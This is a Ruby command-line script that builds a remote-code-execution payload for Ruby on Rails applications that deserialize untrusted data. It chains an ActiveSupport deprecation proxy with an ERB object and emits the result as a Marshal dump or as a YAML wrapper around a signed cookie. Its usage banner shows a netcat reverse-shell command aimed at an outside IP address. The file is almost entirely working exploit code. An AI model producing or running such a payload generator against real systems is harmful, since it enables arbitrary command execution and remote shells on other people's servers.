#!/usr/bin/env ruby

require "delegate"
require "base64"
require "erb"
require "optparse"
require "yaml"
require 'openssl'

module ActiveSupport
  class Deprecation
    class DeprecatedInstanceVariableProxy
      def initialize(instance, method, var, deprecator)
        @instance = instance
        @method = method
        @var = var
        @deprecator = deprecator 
      end
    end
  end
end

def get_content spec # use stdin if spec '-', content of spec file, or spec itself as content
  spec ? ( spec.strip == '-' ? STDIN.read : ( File.exists?(spec) ? File.open(spec,'r').read : spec ) ).strip : nil
end

opts = { :format => "marshal" }
op = OptionParser.new 
op.banner = "usage: #{$0} [opts]\nexample: #{$0} -c 'nc -e /bin/sh 10.0.0.1 1234' > payload.bin"
op.on("-e", "--code code|filename|-", "Ruby code to execute") do |e| opts[:code] = get_content e end
op.on("-c", "--command command|filename|-", "Shell command to execute") do |c| opts[:command] = get_content c end
op.on("-y", "--yaml", "Apply YAML to Marshal wrapper") {|f| opts[:format] = "yaml"}
op.parse!
 
if opts[:code] && opts[:command] || !opts[:code] && !opts[:command] then
  $stderr.puts "ERROR: must specify either ruby code (-e) or shell command (-c) "
  puts op
  exit
end

code = opts[:code] || "`#{opts[:command].gsub(/\`/,'\\\`')}`"

# create payload
erb = ERB.allocate
erb.instance_variable_set :@src, code
erb.instance_variable_set :@lineno, 1
depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new erb, :result, "foo", ActiveSupport::Deprecation

if opts[:format] == 'yaml'
  load(File.dirname(__FILE__) + '/yaml_marshal_bridge_gadgets.rb')
  
  cookies = {}
  verifier = ActiveSupport::MessageVerifier.new("A"*64, 'SHA1', Marshal)
  cookie_jar = ActionDispatch::Cookies::SignedCookieJar.new(cookies, {}, verifier)
  cookies[:to_sym] = cookie_jar.verifier.generate(depr)
  
  caller = OpenStruct.new(cookie_jar)
  
  hashlike = ActiveSupport::OrderedOptions.new
  hashlike[caller] = 1
  
  print YAML.dump(hashlike)
elsif opts[:format] == 'marshal'
  print Marshal.dump(depr)
else
  raise "Unknown wrapper type: #{opts[:wrapper]}"
end

